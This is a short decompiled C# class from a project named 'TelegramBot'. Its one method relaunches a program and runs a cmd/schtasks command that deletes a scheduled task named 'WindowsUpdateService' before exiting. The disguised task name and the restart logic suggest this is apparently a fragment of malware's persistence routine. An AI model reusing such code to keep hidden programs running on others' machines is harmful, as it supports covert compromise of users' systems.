using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace TelegramBot
{
	// Token: 0x020000DF RID: 223
	internal class ReRun
	{
		// Token: 0x060002D8 RID: 728 RVA: 0x00003059 File Offset: 0x00001259
		public static void ReUse(string path)
		{
			Process.Start(path);
			Process.Start("cmd", "/c schtasks.exe /Delete /TN WindowsUpdateService /F");
			Thread.Sleep(1000);
			Application.Exit();
		}
	}
}
